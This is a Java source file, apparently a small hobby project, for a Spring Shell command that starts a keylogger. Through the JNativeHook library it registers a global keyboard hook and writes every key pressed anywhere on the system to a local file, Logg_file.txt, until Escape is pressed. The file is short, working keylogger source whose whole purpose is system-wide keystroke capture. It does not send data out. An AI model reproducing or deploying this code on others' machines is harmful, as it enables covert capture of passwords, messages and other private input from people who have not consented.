package com.KeyLogger.keylogger;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import org.springframework.shell.standard.ShellComponent;
import org.springframework.shell.standard.ShellMethod;
import org.springframework.shell.standard.ShellOption;

import java.io.IOException;

@ShellComponent
public class MyCommands implements NativeKeyListener {
    private final ConfigLogger Loger;
    public MyCommands() throws IOException{
        this.Loger = new ConfigLogger("Logg_file.txt");
    }
    @ShellMethod(key = "log")
    public String helloWorld(
            @ShellOption(defaultValue = "spring") String time
    ) {
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException ex) {
            return "Failed to initialize JNativeHook: " + ex.getMessage();
        }
        GlobalScreen.addNativeKeyListener(this);
        return "Started Logging..." + time;
    }
    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
        if(e.getKeyCode() == NativeKeyEvent.VC_ESCAPE){
            Loger.writeEndFile();
            System.out.println("Finish Logging");
            System.exit(0);
        }
        // Handle the key pressed event
          Loger.writeFile(keyText);
    }

}